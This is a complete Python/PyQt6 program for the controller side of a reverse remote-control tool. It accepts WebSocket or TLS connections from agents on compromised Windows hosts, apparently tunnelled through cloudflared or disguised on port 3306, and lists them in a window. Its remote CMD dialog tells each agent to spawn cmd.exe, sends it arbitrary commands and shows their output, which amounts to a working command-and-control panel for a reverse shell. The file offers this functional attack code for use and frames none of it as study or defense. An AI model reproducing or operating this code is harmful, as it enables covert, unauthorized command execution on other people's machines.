import sys
import os
import socket
import threading
import ssl
import hashlib
import base64
import time
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView, QRadioButton, QButtonGroup)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
import struct

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A


def ws_compute_accept(key: bytes) -> bytes:
    """计算标准Sec-WebSocket-Accept应答值"""
    magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    sha1 = hashlib.sha1(key + magic).digest()
    return base64.b64encode(sha1)


def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
    """服务端：对客户端带mask的payload解掩码"""
    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))


def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
    """
    构建服务端WebSocket帧：**服务端禁止mask**
    """
    header = bytearray()
    # 第一个字节 fin + opcode
    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
    header.append(b1)

    length = len(payload)
    b2 = 0  # 服务端 mask位=0

    if length <= 125:
        b2 |= length
        header.append(b2)
    elif length <= 0xFFFF:
        b2 |= 126
        header.append(b2)
        header.extend(struct.pack(">H", length))
    else:
        b2 |= 127
        header.append(b2)
        header.extend(struct.pack(">Q", length))

    # 服务端不加mask key，直接拼接payload
    return bytes(header) + payload


def ws_parse_frame(data: bytearray):
    """
    解析WebSocket帧（服务端，客户端发来带mask）
    返回：(fin, opcode, payload, consumed_bytes)
    数据不足返回 (None, None, None, 0)；协议错误返回None
    """
    if len(data) < 2:
        return (None, None, None, 0)
    p = 0
    b1 = data[p]
    p += 1
    b2 = data[p]
    p += 1

    fin = bool(b1 & 0x80)
    opcode = b1 & 0x0F
    has_mask = bool(b2 & 0x80)
    payload_len = b2 & 0x7F

    if payload_len == 126:
        if len(data) < p + 2:
            return (None, None, None, 0)
        payload_len = struct.unpack(">H", data[p:p+2])[0]
        p += 2
    elif payload_len == 127:
        if len(data) < p + 8:
            return (None, None, None, 0)
        payload_len = struct.unpack(">Q", data[p:p+8])[0]
        p += 8

    mask_key = b""
    if has_mask:
        if len(data) < p + 4:
            return (None, None, None, 0)
        mask_key = data[p:p+4]
        p += 4

    total_need = p + payload_len
    if len(data) < total_need:
        return (None, None, None, 0)

    raw_payload = data[p:p+payload_len]
    if has_mask:
        payload = ws_unmask_payload(raw_payload, mask_key)
    else:
        payload = raw_payload

    consumed = total_need
    return (fin, opcode, payload, consumed)


def ws_handle_http_upgrade(sock: socket.socket) -> bool:
    """处理WebSocket HTTP GET 升级握手，增大缓冲区适配cloudflared长请求头"""
    buf = bytearray()
    start = time.time()
    try:
        while True:
            if time.time() - start > 20:
                print("[ws_handle_http_upgrade]握手总超时20s")
                return False
            chunk = sock.recv(4096)
            if not chunk:
                time.sleep(0.02)
                continue
            buf.extend(chunk)
            if b"\r\n\r\n" in buf:
                break
    except Exception as e:
        print(f"[ws_handle_http_upgrade]读取http header异常: {repr(e)}")
        return False

    print(f"[ws_handle_http_upgrade]收到完整HTTP头:\n{buf.decode('utf-8', errors='replace')}")

    first_line = buf.split(b"\r\n")[0]
    parts = first_line.split(b" ")
    if len(parts) < 3:
        print("[ws_handle_http_upgrade] http请求行解析失败")
        return False
    method, path, proto = parts
    # 允许路径 / 和 /ws
    if path not in (b"/", b"/ws"):
        print(f"[ws_handle_http_upgrade]非法请求路径:{path}")
        return False

    # 逐行解析header，key转小写，value strip去除前后空格
    headers = {}
    for line in buf.split(b"\r\n")[1:]:
        if not line:
            continue
        if b":" in line:
            k, v = line.split(b":", 1)
            headers[k.strip().lower()] = v.strip()

    conn_val = headers.get(b"connection", b"")
    upgrade_val = headers.get(b"upgrade", b"")
    ws_key = headers.get(b"sec-websocket-key")
    ws_version = headers.get(b"sec-websocket-version")

    print(f"[DEBUG] conn_val={conn_val}, upgrade_val={upgrade_val}, ws_key={ws_key}, ws_version={ws_version}")

    if conn_val != b"Upgrade":
        print("[ws_handle_http_upgrade] Connection头校验失败")
        return False
    if upgrade_val != b"websocket":
        print("[ws_handle_http_upgrade] Upgrade头校验失败")
        return False
    if not ws_key:
        print("[ws_handle_http_upgrade]缺少Sec‑WebSocket‑Key")
        return False
    if ws_version != b"13":
        print(f"[ws_handle_http_upgrade] Sec‑WebSocket‑Version错误:{ws_version}")
        return False

    client_key = ws_key
    accept_val = ws_compute_accept(client_key)

    resp = (
        b"HTTP/1.1 101 Switching Protocols\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: Upgrade\r\n"
        b"Sec-WebSocket-Accept: " + accept_val + b"\r\n"
        b"\r\n"
    )
    try:
        sock.sendall(resp)
        print(f"[ws_handle_http_upgrade] 101响应已发送, path={path.decode()}")
    except Exception as e:
        print(f"[ws_handle_http_upgrade] send 101响应失败: {repr(e)}")
        return False
    return True


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, addr):
        self.conn = conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self._send_lock = threading.Lock()
        # ws分片缓存
        self._frag_buf = bytearray()
        self._frag_opcode = 0

    def send_packet(self, body: bytes) -> bool:
        """
        上层调用和原来完全一样！
        body就是原来业务包(PING/SPAW/KILL/EXEK...)，内部包装成WebSocket BINARY帧
        """
        if not self.connected:
            return False
        try:
            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, body)
            with self._send_lock:
                self.conn.sendall(ws_frame)
            return True
        except (OSError, BrokenPipeError, ssl.SSLError):
            self.close()
            return False

    def reset_fragment(self):
        self._frag_buf.clear()
        self._frag_opcode = 0

    def close(self):
        self.connected = False
        try:
            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
            self.conn.sendall(frame_close)
        except Exception:
            pass
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        # 获取exe/脚本所在目录，解决证书相对路径问题
        self.base_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        self.crt_path = os.path.join(self.base_dir, "server.crt")
        self.key_path = os.path.join(self.base_dir, "server.key")

        self.setWindowTitle("WS / WSS WebSocket反向控制主控端")
        self.resize(720, 520)
        self.server_sock: socket.socket | None = None
        self.ssl_context = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        # 模式切换单选
        self.radio_ws = QRadioButton("明文 WS (cloudflared隧道)")
        self.radio_wss = QRadioButton("WSS加密 (agent直连)")
        self.radio_ws.setChecked(True)
        self.mode_group = QButtonGroup()
        self.mode_group.addButton(self.radio_ws)
        self.mode_group.addButton(self.radio_wss)
        # 切换单选时自动填充默认端口，用户仍可手动修改
        self.radio_ws.toggled.connect(self.on_mode_switch)
        self.radio_wss.toggled.connect(self.on_mode_switch)

        top_lay.addWidget(self.radio_ws)
        top_lay.addWidget(self.radio_wss)

        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("3306")
        top_lay.addWidget(self.port_edit)

        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        # 心跳定时器：10秒发一次PING
        self.ping_timer = QTimer(self)
        self.ping_timer.setInterval(10000)
        self.ping_timer.timeout.connect(self.broadcast_ping)

    def on_mode_switch(self):
        """切换模式自动填入默认端口，允许用户手动改写输入框"""
        if self.radio_ws.isChecked():
            self.port_edit.setText("3306")
        else:
            self.port_edit.setText("4433")

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    @pyqtSlot()
    def broadcast_ping(self):
        for sess in list(self.client_model.items):
            if sess.connected:
                sess.send_packet(b"PING")

    def accept_loop(self):
        use_wss = self.radio_wss.isChecked()
        while self.server_running:
            try:
                raw_conn, addr = self.server_sock.accept()
                client_conn = raw_conn
                # 如果WSS模式，则执行TLS包装
                if use_wss:
                    try:
                        client_conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
                    except ssl.SSLError as e:
                        self.log(f"TLS握手失败 {addr}: {e}")
                        raw_conn.close()
                        continue

                # WebSocket HTTP Upgrade握手
                ok_handshake = ws_handle_http_upgrade(client_conn)
                if not ok_handshake:
                    self.log(f"WebSocket HTTP升级握手失败 {addr}")
                    client_conn.close()
                    continue

                sess = ClientSession(client_conn, addr)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"[新接入] {sess.ip_str}")
                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                t.start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] WebSocket连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"[断开] {sess.ip_str}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)

                while True:
                    ret = ws_parse_frame(buf)
                    fin, opcode, payload, consumed = ret
                    if consumed <= 0:
                        break
                    # 移除已经消费的数据
                    del buf[:consumed]

                    # 处理控制帧 PING/PONG/CLOSE
                    if opcode == WS_OP_PING:
                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
                        with sess._send_lock:
                            sess.conn.sendall(pong_frame)
                        continue
                    elif opcode == WS_OP_PONG:
                        continue
                    elif opcode == WS_OP_CLOSE:
                        break
                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                        # 处理分片
                        if opcode == WS_OP_BINARY:
                            sess.reset_fragment()
                            sess._frag_opcode = opcode
                        sess._frag_buf.extend(payload)
                        if fin:
                            full_body = bytes(sess._frag_buf)
                            sess.reset_fragment()
                            # full_body == 原来裸TLS的body，业务逻辑完全复用！
                            if len(full_body) >= 4:
                                cmd_code = full_body[0:4]
                                if cmd_code == b"PONG":
                                    sess.last_pong = datetime.now()
                                    self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                                elif cmd_code == b"OUTP":
                                    output_bytes = full_body[4:]
                                    out_text = output_bytes.decode("gbk", errors="replace")
                                    sess.signals.on_outp.emit(sess, out_text)

            except (OSError, ssl.SSLError):
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        use_wss = self.radio_wss.isChecked()

        if use_wss:
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.ssl_context.load_cert_chain(certfile=self.crt_path, keyfile=self.key_path)
            self.log(f"WSS加密模式启动，监听端口 {port}，监听全部网卡 0.0.0.0")
            self.log(f"crt路径: {self.crt_path}")
            self.log(f"key路径: {self.key_path}")
            bind_addr = "0.0.0.0"
        else:
            self.ssl_context = None
            self.log(f"明文WS模式启动，监听端口 {port}")
            bind_addr = "0.0.0.0"

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((bind_addr, port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()

        self.ping_timer.start()

        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)

    def stop_server(self):
        self.ping_timer.stop()

        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程CMD会话")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
